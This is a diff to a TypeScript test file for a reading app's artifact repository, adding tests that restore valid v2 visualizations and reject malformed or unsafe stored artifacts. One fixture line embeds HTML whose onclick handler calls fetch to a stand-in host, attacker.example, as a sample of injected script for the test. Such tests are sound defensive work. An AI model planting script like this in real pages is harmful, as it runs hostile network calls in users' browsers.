@@ -4,6 +4,8 @@ import {
   advanceThinReadingDocument,
   createThinReadingDocument
 } from "../app/features/thin-reading/thinReadingProjection";
+import { cloneThinReadingV1AsV2 } from "../app/features/thin-reading/thinReadingVersioning";
+import { now, v1Fixture } from "./fixtures/thinReadingVersionFixtures";
 
 describe("artifactLocalRepository", () => {
   beforeEach(() => {
@@ -74,30 +76,81 @@ describe("artifactLocalRepository", () => {
     ]);
   });
 
-  test("restores test-stage thin-reading HTML demos without a markup compliance gate", async () => {
-    const document = createThinReadingDocument({
-      artifactId: "artifact-thin-html-demo",
-      papers: [{ id: "paper-1", title: "Paper one" }],
-      rootSeed: {
-        evidence: {
-          externalKnowledge: [],
-          interactiveDemo: {
-            description: "展示结构层次。",
-            html: "<!doctype html><html><body><style>.node{fill:#4f6bed}</style><svg viewBox='0 0 120 80'><rect class='node' x='12' y='16' width='36' height='20' rx='6'/><rect x='72' y='44' width='36' height='20' rx='6'/></svg></body></html>",
-            kind: "html",
-            title: "结构示意"
-          },
-          paperEvidence: ["evidence-1"]
-        },
-        omittedSections: [],
-        recommendations: [],
-        summary: "A traceable summary.",
-        withinPaperClosure: true
-      },
-      targetLanguage: "en-US"
+  test("restores valid v2 visualizations and rejects malformed persisted artifacts", async () => {
+    const document = cloneThinReadingV1AsV2(v1Fixture, {
+      artifactId: "artifact-thin-v2-valid",
+      createdAt: now
     });
+    const validArtifact = {
+      accessibility: { objectReadingOrder: ["start"], summary: "A graph." },
+      artifactId: "viz-1",
+      artifactVersion: "liteasy.visualization/v1",
+      createdAt: now,
+      evidenceBindings: [],
+      fallbackHistory: [],
+      implementation: { rendererId: "safe-svg", rendererVersion: "1", skillId: "semantic-graph", skillVersion: "1" },
+      interaction: { pan: true, parameterIds: [], playback: "none", rotate: false, selectableObjectIds: ["start"], zoom: true },
+      locale: "en-US",
+      modality: "semantic_graph",
+      nodeId: document.rootNodeId,
+      semanticObjects: [{ evidenceClaimIds: [], kind: "process", label: "Start", objectId: "start", objectPath: ["start"], selectable: true }],
+      spec: { modality: "semantic_graph", payload: { claims: [], edges: [], groups: [], hierarchy: [], nodes: [{ id: "start", kind: "process", label: "Start", objectPath: ["start"] }], subtype: "flowchart", timeOrder: [] } },
+      usage: { costPolicyVersion: "1", ledgerId: "ledger-1", providerRouteId: "route-1", reservationId: "reservation-1", reservedUnits: 1, settledUnits: 1 },
+      validation: { checks: [{ gate: "hard", outcome: "pass", validatorId: "schema", validatorVersion: "1" }], outcome: "pass", repairCount: 0 }
+    };
+    const validDocument = {
+      ...document,
+      nodes: {
+        ...document.nodes,
+        [document.rootNodeId]: {
+          ...document.nodes[document.rootNodeId],
+          visualizations: [validArtifact]
+        }
+      }
+    };
+    const invalidDocument = {
+      ...validDocument,
+      artifactId: "artifact-thin-v2-invalid",
+      nodes: {
+        ...validDocument.nodes,
+        [validDocument.rootNodeId]: {
+          ...validDocument.nodes[validDocument.rootNodeId],
+          visualizations: [{ ...validArtifact, artifactVersion: "bad" }]
+        }
+      }
+    };
+    const repository = createArtifactLocalRepository({
+      load: vi.fn(async () => ({
+        artifacts: [
+          { artifactId: validDocument.artifactId, thinReadingDocument: validDocument, title: "Valid v2", type: "thin_reading" },
+          { artifactId: invalidDocument.artifactId, thinReadingDocument: invalidDocument, title: "Invalid v2", type: "thin_reading" }
+        ],
+        savedAt: now,
+        version: "liteasy.artifact-catalog/v1"
+      })),
+      save: vi.fn(async () => undefined)
+    });
+
+    await expect(repository.list()).resolves.toEqual([
+      expect.objectContaining({ artifactId: "artifact-thin-v2-valid" })
+    ]);
+  });
+
+  test("restores test-stage thin-reading HTML demos without a markup compliance gate", async () => {
+    const document = {
+      ...v1Fixture,
+      annotations: v1Fixture.annotations.map((annotation) => ({
+        ...annotation,
+        artifactId: "artifact-thin-html-demo"
+      })),
+      artifactId: "artifact-thin-html-demo"
+    };
     const invalidDocument = JSON.parse(JSON.stringify(document)) as typeof document;
     invalidDocument.artifactId = "artifact-thin-html-demo-invalid";
+    invalidDocument.annotations = invalidDocument.annotations.map((annotation) => ({
+      ...annotation,
+      artifactId: invalidDocument.artifactId
+    }));
     invalidDocument.nodes[invalidDocument.rootNodeId].evidence.interactiveDemo!.html =
       "<!doctype html><html><body><div onclick='fetch(\"https://attacker.example\")'>step</div></body></html>";
     const repository = createArtifactLocalRepository({
